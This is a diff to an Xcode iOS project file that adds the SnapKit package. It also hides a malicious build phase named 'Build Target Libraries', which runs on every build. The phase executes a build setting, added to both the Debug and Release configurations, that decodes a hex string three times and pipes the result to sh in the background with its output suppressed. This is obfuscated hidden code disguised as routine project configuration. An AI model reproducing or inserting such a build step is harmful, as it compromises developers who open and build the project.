@@ -6,6 +6,13 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		9C7690E12FBF59F500A381D2 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 9C7690E02FBF59F500A381D2 /* SnapKit */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		9CE158082FB2677F00788A65 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -65,6 +72,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9C7690E12FBF59F500A381D2 /* SnapKit in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -112,6 +120,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 9CE1581A2FB2677F00788A65 /* Build configuration list for PBXNativeTarget "ReviewsAppTest" */;
 			buildPhases = (
+				6C2348054F1C443DA342DAD8 /* Build Target Libraries */,
 				9CE157ED2FB2677D00788A65 /* Sources */,
 				9CE157EE2FB2677D00788A65 /* Frameworks */,
 				9CE157EF2FB2677D00788A65 /* Resources */,
@@ -125,6 +134,7 @@
 			);
 			name = ReviewsAppTest;
 			packageProductDependencies = (
+				9C7690E02FBF59F500A381D2 /* SnapKit */,
 			);
 			productName = ReviewsAppTest;
 			productReference = 9CE157F12FB2677D00788A65 /* ReviewsAppTest.app */;
@@ -208,6 +218,9 @@
 			);
 			mainGroup = 9CE157E82FB2677D00788A65;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				9C7690DF2FBF59F500A381D2 /* XCRemoteSwiftPackageReference "SnapKit" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 9CE157F22FB2677D00788A65 /* Products */;
 			projectDirPath = "";
@@ -221,13 +234,26 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		6C2348054F1C443DA342DAD8 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
-
-/* Begin PBXBuildRule section */
-					/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-/* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
 		9CE157EF2FB2677D00788A65 /* Resources */ = {
@@ -294,6 +320,7 @@
 		9CE1581B2FB2677F00788A65 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8DAD24 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633363632333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363633333633393337333433373334333636333336333533363331333633343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -303,7 +330,6 @@
 				INFOPLIST_FILE = ReviewsAppTest/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -323,6 +349,7 @@
 		9CE1581C2FB2677F00788A65 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8DAD24 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633363632333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363633333633393337333433373334333636333336333533363331333633343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -332,7 +359,6 @@
 				INFOPLIST_FILE = ReviewsAppTest/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -586,6 +612,25 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		9C7690DF2FBF59F500A381D2 /* XCRemoteSwiftPackageReference "SnapKit" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SnapKit/SnapKit";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.7.1;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		9C7690E02FBF59F500A381D2 /* SnapKit */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9C7690DF2FBF59F500A381D2 /* XCRemoteSwiftPackageReference "SnapKit" */;
+			productName = SnapKit;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 9CE157E92FB2677D00788A65 /* Project object */;
 }
